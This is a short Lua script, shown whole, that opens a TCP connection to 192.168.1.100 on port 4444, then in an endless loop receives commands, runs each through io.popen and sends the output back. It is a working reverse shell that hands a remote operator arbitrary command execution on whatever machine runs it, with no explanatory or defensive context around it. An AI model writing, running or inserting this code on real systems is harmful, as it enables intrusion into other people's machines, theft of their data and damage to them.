local socket = require("socket")
local client = socket.tcp()

client:connect("192.168.1.100", 4444)
while true do
    local command = client:receive()
    local handle = io.popen(command)
    local result = handle:read("*a")
    handle:close()
    client:send(result)
end